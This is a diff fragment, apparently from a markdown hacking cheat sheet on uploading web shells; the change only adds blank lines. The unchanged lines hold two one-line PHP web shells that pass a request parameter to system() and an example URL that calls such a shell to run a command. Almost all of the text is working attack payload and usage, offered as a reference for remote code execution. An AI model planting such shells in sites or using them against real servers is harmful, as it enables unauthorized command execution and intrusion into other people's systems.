@@ -63,11 +63,14 @@ Web Shell Upload:
 Basic PHP Web Shell:
 
       <?php system($_REQUEST[cmd]); ?>
+      
 OR 
+      
       <?php system($_GET['cmd']); ?>
  
 ### For RCE , Call Upload Web shell 
 
 Example :
           url/upload_file.php?parameter=commnad
+
           http://cyberteach360/shell.php?cmd=id
